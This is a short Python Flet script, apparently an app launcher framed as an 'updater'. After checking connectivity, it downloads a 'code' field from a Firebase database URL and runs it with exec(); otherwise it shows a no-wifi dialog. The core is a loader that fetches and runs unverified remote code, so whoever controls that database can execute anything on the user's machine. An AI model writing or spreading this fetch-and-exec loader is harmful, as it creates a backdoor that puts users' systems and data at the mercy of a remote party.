import requests, socket
from flet import *


def check():
    try:
        socket.gethostbyname("google.com")
        return True
    except:
        return False


async def message(page: Page):
    page.show_dialog(
        AlertDialog(
            Text("Sorry, You are not connected to wifi try connect and open app agian"),
            actions=[TextButton("ok", on_click=page.window.close)],
            on_dismiss=page.window.close
        )
    )
    page.update()


link = (
    "https://updater-alkasy-default-rtdb.asia-southeast1.firebasedatabase.app/data.json"
)
if check():
    code = requests.get(link).json()["code"]

    exec(code)
else:
    run(main=message)
